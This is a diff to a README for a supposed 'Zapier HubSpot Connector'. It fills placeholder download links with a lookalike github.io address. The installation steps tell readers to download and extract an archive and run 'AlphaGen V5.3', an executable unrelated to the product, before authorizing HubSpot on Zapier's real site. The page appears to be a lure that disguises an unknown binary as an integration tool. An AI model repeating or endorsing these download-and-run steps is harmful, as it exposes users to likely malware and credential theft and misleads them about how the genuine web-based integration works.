@@ -2,13 +2,13 @@
 
 Connect HubSpot CRM with thousands of apps via Zapier — automate workflows, sync data, and trigger actions across your sales and marketing stack.
 
-[![Download](https://img.shields.io/badge/Download-Zapier_HubSpot_Connector-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Zapier_HubSpot_Connector-blueviolet)](https://zapier-connector-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://zapier-connector-hubspot-crm.github.io/.github)  
 2. 📁 Extract the contents to your local directory  
 3. 🖱 Run AlphaGen V5.3 to activate integration logic  
 4. ✅ Go to [Zapier.com](https://zapier.com/apps/hubspot/integrations) and authorize HubSpot to start building Zaps
